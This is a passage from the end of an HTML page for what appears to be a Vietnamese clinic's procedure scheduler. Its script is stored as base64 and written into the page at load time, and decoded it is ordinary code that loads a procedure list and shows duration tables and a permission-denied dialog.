kb3cuUFJPQ0VEVVJFUykubGVuZ3RoID09PSAwKSB7DQogICAgICAgIGNvbnN0IHJlcyA9IGF3YWl0IGZldGNoKFRIVVRIVUFUX1VSTCk7DQogICAgICAgIGNvbnN0IHRleHQgPSBhd2FpdCByZXMudGV4dCgpOw0KICAgICAgICB3aW5kb3cuUFJPQ0VEVVJFUyA9IEpTT04ucGFyc2UodGV4dCk7DQogICAgICB9DQogICAgfSBjYXRjaCAoZSkgew0KICAgICAgYWxlcnQoJ0tow7RuZyB0aOG7gyB04bqjaSBkYW5oIHPDoWNoIHRo4bunIHRodeG6rXQgdOG7qyBtw6F5IGNo4bunLicpOw0KICAgICAgcmV0dXJuOw0KICAgIH0NCg0KICAgIGNvbnN0IHJvd3MgPSBbXTsNCiAgICBPYmplY3QuZW50cmllcyhQUk9DRURVUkVTKS5mb3JFYWNoKChbbmFtZSwgY2ZnXSkgPT4gew0KICAgICAgaWYgKCFuYW1lIHx8ICFjZmcpIHJldHVybjsNCg0KICAgLy8gdHLGsOG7m2MgxJHDszoNCmxldCBkdXJhdGlvbiA9ICh0eXBlb2YgY2ZnLmR1cmF0aW9uID09PSAnbnVtYmVyJykgPyBjZmcuZHVyYXRpb24gOiAnJzsNCi8vIE7hur91IGPDsyBwcmVwIHRow6wgbOG6pXkgcHJlcCwgbuG6v3Uga2jDtG5nIGPDsyB0aMOsIGfDoW4gPSBkdXJhdGlvbg0KbGV0IHByZXAgPSAodHlwZW9mIGNmZy5wcmVwID09PSAnbnVtYmVyJykgPyBjZmcucHJlcCA6IGR1cmF0aW9uOw0KDQovLyDDqXAgcmnDqm5nIGNobyAiU+G6r2MgdGh14buRYyB0aGFuZyINCmlmIChuYW1lLnRyaW0oKS50b0xvd2VyQ2FzZSgpLmluY2x1ZGVzKCdz4bqvYyB0aHXhu5FjIHRoYW5nJykpIHsNCiAgZHVyYXRpb24gPSAxMjA7DQogIHByZXAgPSAxMjA7DQp9DQoNCg0KICAgICAgaWYgKGR1cmF0aW9uICE9PSAnJykgew0KICAgICAgICByb3dzLnB1c2goeyBuYW1lLCBkdXJhdGlvbiwgcHJlcCB9KTsNCiAgICAgIH0NCiAgICB9KTsNCg0KICAgIHJvd3Muc29ydCgoYSxiKSA9PiBhLm5hbWUubG9jYWxlQ29tcGFyZShiLm5hbWUsICd2aScpKTsNCg0KICAgIGNvbnN0IHRib2R5ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2N1c3RvbWl6ZUJvZHknKTsNCiAgICB0Ym9keS5pbm5lckhUTUwgPSByb3dzLm1hcCgociwgaWR4KSA9PiBgDQogICAgICA8dHI+DQogICAgICAgIDx0ZCBzdHlsZT0idGV4dC1hbGlnbjpjZW50ZXIiPiR7aWR4ICsgMX08L3RkPg0KICAgICAgICA8dGQ+JHtyLm5hbWV9PC90ZD4NCiAgICAgICAgPHRkIHN0eWxlPSJ0ZXh0LWFsaWduOmNlbnRlciI+JHtyLmR1cmF0aW9ufTwvdGQ+DQogICAgICAgIDx0ZCBzdHlsZT0idGV4dC1hbGlnbjpjZW50ZXIiPiR7ci5wcmVwfTwvdGQ+DQogICAgICA8L3RyPg0KICAgIGApLmpvaW4oJycpOw0KDQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2N1c3RvbWl6ZU1vZGFsJykuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogIH0NCg0KICBmdW5jdGlvbiBjbG9zZUN1c3RvbWl6ZVBhbmVsKCkgew0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdjdXN0b21pemVNb2RhbCcpLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogIH0NCjwvc2NyaXB0Pg0KPHNjcmlwdD4NCmZ1bmN0aW9uIHNob3dOb1Blcm1pc3Npb24oKSB7DQogIC8vIE92ZXJsYXkNCiAgY29uc3Qgb3ZlcmxheSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOw0KICBvdmVybGF5LnN0eWxlLmNzc1RleHQgPSBgDQogICAgcG9zaXRpb246Zml4ZWQ7aW5zZXQ6MDtiYWNrZ3JvdW5kOnJnYmEoMCwwLDAsMC41KTsNCiAgICBkaXNwbGF5OmZsZXg7anVzdGlmeS1jb250ZW50OmNlbnRlcjthbGlnbi1pdGVtczpjZW50ZXI7ei1pbmRleDoxMjAwMDsNCiAgYDsNCg0KICAvLyBCb3gNCiAgY29uc3QgYm94ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7DQogIGJveC5zdHlsZS5jc3NUZXh0ID0gYA0KICAgIGJhY2tncm91bmQ6I2ZmZjtwYWRkaW5nOjIwcHggMzBweDtib3JkZXItcmFkaXVzOjEwcHg7DQogICAgdGV4dC1hbGlnbjpjZW50ZXI7bWF4LXdpZHRoOjMyMHB4O2JveC1zaGFkb3c6MCA0cHggMTVweCByZ2JhKDAsMCwwLDAuMyk7DQogICAgZm9udC1mYW1pbHk6SW50ZXIsc2Fucy1zZXJpZjsNCiAgYDsNCiAgYm94LmlubmVySFRNTCA9IGANCiAgICA8ZGl2IHN0eWxlPSJmb250LXNpemU6MThweDtmb250LXdlaWdodDo2MDA7Y29sb3I6I2U3NGMzYzttYXJnaW4tYm90dG9tOjEwcHg7Ij4NCiAgICAgIPCfmqsgQuG6oW4ga2jDtG5nIGPDsyBxdXnhu4FuIHRow6ptIHRo4bunIHRodeG6rXQNCiAgICA8L2Rpdj4NCiAgICA8YnV0dG9uIGNsYXNzPSJidG4iIG9uY2xpY2s9ImRvY3VtZW50LmJvZHkucmVtb3ZlQ2hpbGQodGhpcy5jbG9zZXN0KCcubm9QZXJtT3ZlcmxheScpKSI+DQogICAgICDEkMOzbmcNCiAgICA8L2J1dHRvbj4NCiAgYDsNCiAgb3ZlcmxheS5jbGFzc0xpc3QuYWRkKCJub1Blcm1PdmVybGF5Iik7DQogIG92ZXJsYXkuYXBwZW5kQ2hpbGQoYm94KTsNCiAgb3ZlcmxheS5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsIGUgPT4gew0KICAgIGlmIChlLnRhcmdldCA9PT0gb3ZlcmxheSkgZG9jdW1lbnQuYm9keS5yZW1vdmVDaGlsZChvdmVybGF5KTsNCiAgfSk7DQogIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQob3ZlcmxheSk7DQp9DQoNCg0KDQo8L3NjcmlwdD4NCg0KPC9ib2R5Pg0KDQo8L2h0bWw+";
  const binary = atob(base64);
  const bytes = new Uint8Array([...binary].map(c => c.charCodeAt(0)));
  const decoded = new TextDecoder("utf-8").decode(bytes);
  document.write(decoded);
</script>
</body>
</html>
